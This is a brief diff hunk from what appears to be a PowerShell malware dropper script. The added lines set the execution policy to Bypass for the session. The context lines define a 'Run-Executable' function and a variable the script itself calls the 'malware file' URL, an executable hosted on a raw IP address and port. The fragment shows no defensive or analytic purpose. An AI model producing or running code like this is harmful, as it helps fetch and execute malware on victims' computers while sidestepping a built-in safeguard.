@@ -53,6 +53,9 @@ function Run-Executable {
     }
 }
 
+# Set execution policy to bypass for the current session
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+
 # URL of the malware file
 $malwareUrl = "http://54.224.34.222:3004/uploads/BootyMistress.exe"
 
